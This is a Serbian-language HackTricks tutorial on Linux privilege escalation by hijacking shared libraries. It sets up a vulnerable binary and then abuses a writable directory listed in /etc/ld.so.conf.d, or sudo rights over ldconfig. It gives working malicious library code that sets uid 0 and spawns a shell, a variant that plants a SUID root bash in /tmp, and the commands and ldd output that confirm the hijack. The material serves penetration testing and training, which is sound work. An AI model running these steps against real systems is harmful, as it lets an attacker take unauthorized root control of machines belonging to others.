# ld.so privesc exploit example

{{#include ../../banners/hacktricks-training.md}}

## Pripremite okruženje

U sledećem delu možete pronaći kod fajlova koje ćemo koristiti da pripremimo okruženje

{{#tabs}}
{{#tab name="sharedvuln.c"}}
```c
#include <stdio.h>
#include "libcustom.h"

int main(){
printf("Welcome to my amazing application!\n");
vuln_func();
return 0;
}
```
{{#endtab}}

{{#tab name="libcustom.h"}}
```c
#include <stdio.h>

void vuln_func();
```
{{#endtab}}

{{#tab name="libcustom.c"}}
```c
#include <stdio.h>

void vuln_func()
{
puts("Hi");
}
```
{{#endtab}}
{{#endtabs}}

1. **Kreiraj** te fajlove na svojoj mašini u istom folderu
2. **Komplajliraj** **biblioteku**: `gcc -shared -o libcustom.so -fPIC libcustom.c`
3. **Kopiraj** `libcustom.so` u `/usr/lib` i osveži keš: `sudo cp libcustom.so /usr/lib && sudo ldconfig` (root privs)
4. **Komplajliraj** **izvršni fajl**: `gcc sharedvuln.c -o sharedvuln -lcustom`

### Proveri environment

Proveri da li se _libcustom.so_ **učitava** iz _/usr/lib_ i da li možeš da **izvršiš** binary.
```
$ ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffc9a1f7000)
libcustom.so => /usr/lib/libcustom.so (0x00007fb27ff4d000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fb27fb83000)
/lib64/ld-linux-x86-64.so.2 (0x00007fb28014f000)

$ ./sharedvuln
Welcome to my amazing application!
Hi
```
### Korisne triage komande

Kada napadate stvarni target, proverite **tačan naziv biblioteke** koji binarijum zahteva i šta loader **trenutno razrešava**:
```bash
readelf -d ./sharedvuln | grep NEEDED
ldconfig -p | grep libcustom
/lib64/ld-linux-x86-64.so.2 --list ./sharedvuln 2>/dev/null \
# x86_64; adjust for your arch
LD_DEBUG=libs ./sharedvuln 2>&1 | grep -E 'find library|trying file'
```
Nekoliko korisnih zamki:

- `sudo echo ... > /etc/ld.so.conf.d/x.conf` obično **ne radi** zato što
preusmeravanje radi tvoj trenutni shell. Umesto toga koristi
`echo "/home/ubuntu/lib" | sudo tee /etc/ld.so.conf.d/privesc.conf`.
- **SUID/privileged** binarni fajlovi ignorišu `LD_LIBRARY_PATH`/`LD_PRELOAD` u
**secure-execution mode**, ali direktorijumi koji dolaze iz `/etc/ld.so.conf` su
i dalje deo trusted loader konfiguracije, tako da ova pogrešna konfiguracija može
i dalje da utiče na privileged programe.
- Na novijim glibc verzijama, dynamic loader takođe izlaže
`--list-diagnostics`, što je korisno za debug cache resolution i
`glibc-hwcaps` izbor poddirektorijuma kada hijack ne radi kao što se očekuje.

## Exploit

U ovom scenariju ćemo pretpostaviti da je **neko kreirao ranjiv unos** unutar fajla u _/etc/ld.so.conf/_:
```bash
echo "/home/ubuntu/lib" | sudo tee /etc/ld.so.conf.d/privesc.conf
```
Ranjiva fascikla je _/home/ubuntu/lib_ (gde imamo upisni pristup).\
**Preuzmi i kompiliraj** sledeći kod unutar te putanje:
```c
// gcc -shared -fPIC -Wl,-soname,libcustom.so -o libcustom.so libcustom.c

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>

void vuln_func(void){
setuid(0);
setgid(0);
puts("I'm the bad library");
system("/bin/sh");
}
```
Ako očekujete da će **root** (ili drugi privilegovani nalog) kasnije pokrenuti ranjivi binarni fajl, obično je bolje ostaviti **artifact u vlasništvu root-a** umesto pokretanja interaktivnog shell-a. Na primer:
```c
system("cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash");
```
Zatim, nakon što se dogodi privilegovano izvršavanje, možete koristiti `/tmp/rootbash -p`.

Sada kada smo **kreirali zlonamernu libcustom biblioteku unutar pogrešno konfigurisanog** path-a, treba da sačekamo **reboot** ili da root korisnik izvrši **`ldconfig`** (_u slučaju da možete izvršiti ovaj binary kao **sudo** ili ima **suid bit**, moći ćete sami da ga izvršite_).

Kada se ovo dogodi, **ponovo proverite** odakle `sharedvuln` executable učitava `libcustom.so` biblioteku:
```c
$ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffeee766000)
libcustom.so => /home/ubuntu/lib/libcustom.so (0x00007f3f27c1a000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f3f27850000)
/lib64/ld-linux-x86-64.so.2 (0x00007f3f27e1c000)
```
Kao što možete videti, **učitava ga iz `/home/ubuntu/lib`** i ako ga bilo koji korisnik izvrši, biće pokrenut shell:
```c
$ ./sharedvuln
Welcome to my amazing application!
I'm the bad library
$ whoami
ubuntu
```
> [!TIP]
> Napomena da u ovom primeru nismo eskalirali privilegije, ali izmenom komandi koje se izvršavaju i **čekanjem da root ili drugi privilegovani korisnik pokrene ranjivi binary** moći ćemo da eskaliramo privilegije.

### Druge misconfigurations - Ista vuln

U prethodnom primeru smo lažirali misconfiguration u kojoj je administrator **postavio neprivilegovan folder unutar configuration fajla unutar `/etc/ld.so.conf.d/`**.\
Ali postoje i druge misconfigurations koje mogu da izazovu istu vulnerability; ako imate **write permissions** nad nekim **config fajlom** unutar `/etc/ld.so.conf.d`s, u folderu `/etc/ld.so.conf.d` ili u fajlu `/etc/ld.so.conf`, možete konfigurisati istu vulnerability i exploitovati je.

## Exploit 2

**Pretpostavite da imate sudo privileges nad `ldconfig`**.\
Možete da navedete `ldconfig` **odakle da učita conf fajlove**, pa to možemo iskoristiti da nateramo `ldconfig` da učita arbitrary foldere.\
Dakle, hajde da napravimo fajlove i foldere potrebne da bi se učitao "/tmp":
```bash
cd /tmp
mkdir -p conf
echo "include /tmp/conf/*" > fake.ld.so.conf
echo "/tmp" > conf/evil.conf
```
Sada, kao što je naznačeno u **prethodnom exploit-u**, **kreirajte zlonamernu biblioteku unutar `/tmp`**.\
I na kraju, hajde da učitamo putanju i proverimo odakle binarni fajl učitava biblioteku:
```bash
sudo ldconfig -f fake.ld.so.conf

ldd sharedvuln
linux-vdso.so.1 =>  (0x00007fffa2dde000)
libcustom.so => /tmp/libcustom.so (0x00007fcb07756000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fcb0738c000)
/lib64/ld-linux-x86-64.so.2 (0x00007fcb07958000)
```
**Kao što možete videti, imajući sudo privilegije nad `ldconfig` možete iskoristiti istu ranjivost.**



## References

- [ld.so(8) - Linux manual page](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [ldconfig(8) - Linux manual page](https://man7.org/linux/man-pages/man8/ldconfig.8.html)
{{#include ../../banners/hacktricks-training.md}}
